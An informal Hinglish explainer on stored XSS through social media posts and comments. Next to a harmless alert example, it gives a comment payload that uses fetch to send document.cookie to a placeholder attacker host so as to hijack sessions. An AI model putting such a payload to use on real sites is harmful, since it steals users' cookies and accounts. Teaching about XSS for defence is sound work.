# ✅ First Condition: JavaScript in Post (Social Media)

Agar koi banda Twitter, Facebook jesi site pe post kare aur JavaScript inject kare...

### 🔐 Lekin reality kya hai?

Facebook, Twitter, LinkedIn, etc. jaise platforms har input (post, bio, image caption, etc.) ko heavy filtering aur sanitization se guzarte hain.

Agar filtering na ho (vulnerable ho), to haan — stored XSS ho sakta hai.

### 🎯 Agar filtering na ho to kya ho sakta hai?

Agar koi post me **<script>alert('hacked')</script> daale** aur koi banda wo post dekhe:

Attacker ka JavaScript uske browser/mobile app mein chalega

Phir attacker victim ki cookies, session, location, camera, waghera ka access le sakta hai — depending on browser/app security

### ✅ Yes, mobile ya browser exploit ho sakta hai — agar XSS chal gaya to

### ✅ Second Condition: JavaScript in Comments

Agar post normal ho lekin comment ke through koi JavaScript inject kare...

💥 Ye bilkul classic Stored XSS ka example hai!

Comment store hota hai database mein

Jab dusra user post ke neeche comment dekhta hai

Agar comment XSS payload ho (aur filter na ho), to wo script automatic chal jata hai uske browser/mobile app mein


### 😈 Example:

**<p><script>fetch('https://attacker.com?cookie=' + document.cookie)</script></p>**

Jaise hi koi banda comment dekhta hai, attacker ke server pe victim ki cookie chali jati hai = session hijack ✅

### 📱 Real-world Mobile App mein kya hota hai?

Agar mobile app (jaise Facebook app) webview use karti hai aur input sanitize nahi karti:

Toh XSS webview ke andar bhi chal sakta hai

Mobile ka data (photos, location, camera) target ho sakta hai agar attacker OS-level permission bypass kare (advance level)
